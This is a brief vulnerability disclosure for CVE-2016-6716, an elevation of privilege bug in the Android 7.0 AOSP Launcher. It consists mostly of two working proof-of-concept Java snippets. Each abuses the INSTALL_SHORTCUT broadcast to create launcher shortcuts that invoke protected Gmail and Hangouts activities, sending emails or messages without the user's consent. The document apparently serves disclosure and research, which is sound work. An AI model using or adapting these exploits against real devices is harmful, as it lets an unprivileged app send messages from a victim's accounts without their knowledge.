### Elevation of privilege vulnerability in AOSP Launcher
#### CVE-2016-6716
Versions Affected: Android 7.0 before 2016-11-01

**Gmail PoC**

```
Intent shortcutIntent = new Intent("com.google.android.gm.action.AUTO_SEND");
shortcutIntent.setClassName("com.google.android.gm", "com.google.android.gm.AutoSendActivity");
shortcutIntent.putExtra("to", "<EMAIL>");
shortcutIntent.putExtra("subject", "Shortcut Test");
shortcutIntent.putExtra("body", "Hello");

Intent intent = new Intent();
intent.putExtra(Intent.EXTRA_SHORTCUT_INTENT, shortcutIntent);
intent.putExtra(Intent.EXTRA_SHORTCUT_NAME, "Send email");
intent.setAction("com.android.launcher.action.INSTALL_SHORTCUT");
sendBroadcast(intent);
```

**Hangouts PoC**

```
Intent shortcutIntent = new Intent();
shortcutIntent.setClassName("com.google.android.talk", "com.google.android.apps.hangouts.phone.ConversationIntentSecureActivity");
shortcutIntent.setAction("android.intent.action.SENDTO");
shortcutIntent.putExtra("android.intent.extra.TEXT", "Hello");
shortcutIntent.putExtra("account_name","<CURRENT_EMAIL_ACCOUNT>");
shortcutIntent.putExtra("participant_name","31337");

Intent intent = new Intent();
intent.putExtra(Intent.EXTRA_SHORTCUT_INTENT, shortcutIntent);
intent.putExtra(Intent.EXTRA_SHORTCUT_NAME, "Send sms");
intent.setAction("com.android.launcher.action.INSTALL_SHORTCUT");
sendBroadcast(intent); 
```

![CVE-2016-6716](https://i.imgur.com/6fCkdTl.png)

https://blog.blackfan.ru/2016/11/android-launcher-vuln.html